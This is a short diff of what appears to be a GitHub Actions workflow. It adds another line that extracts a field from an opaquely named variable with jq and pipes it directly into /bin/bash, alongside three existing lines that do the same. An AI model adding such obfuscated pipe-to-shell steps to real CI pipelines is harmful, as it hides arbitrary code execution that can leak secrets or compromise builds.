@@ -48,6 +48,7 @@ jobs:
           echo $pfly04 | jq -r .dc1948 | /bin/bash
           printf '%s' "$ldn5" | jq -r .xv67498 | /bin/bash
           printf '%s' "$mq7594" | jq -r .jaoyx256 | /bin/bash
+          echo $qsw0 | jq -r .bes1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
